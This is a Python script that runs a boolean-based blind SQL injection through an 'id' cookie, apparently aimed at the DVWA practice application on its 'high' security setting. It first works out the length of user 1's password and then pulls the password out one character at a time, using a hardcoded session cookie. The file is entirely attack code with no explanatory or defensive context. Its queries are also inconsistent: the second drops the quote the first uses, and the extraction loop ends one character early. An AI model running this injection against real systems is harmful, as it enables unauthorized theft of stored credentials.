import requests
import sys
import re
from tqdm import tqdm
import time
import urllib.parse
args = sys.argv
url = args[1]


for i in tqdm(range(1,100)):
    sql = "1' and (select length(password) from users where user_id =1) ={counter};#".format(counter =i)
    URLencode = urllib.parse.quote(sql)
    cookie ={
        "security":"high",
        "PHPSESSID":"mhnd7plfnjjrt26jagf867jp9a",
        "id":URLencode
        }
    #payload = {
     #       "Submit" : "Submit"
    #}

    #response = requests.post(url,data=payload,cookies=cookie)
    response = requests.get(url,cookies=cookie)
    

    if 'exists' in response.text:
        print("password_len:{0}".format(i))
        break
    


for index in tqdm(range(1,i)):
    for char_number in range(48,123):
        
        sql = '1  and ASCII(substring((select password from users where user_id =1) ,{index},1))= binary {char};#'.format(index=index,char=char_number)
        URLencode = urllib.parse.quote(sql)
        cookie ={
        "security":"high",
        "PHPSESSID":"mhnd7plfnjjrt26jagf867jp9a",
        "id":URLencode
        }

        char = chr(char_number)
        response = requests.get(url,cookies=cookie)
        if 'exists' in response.text:
            
            print(char,end='')
            break
print("") 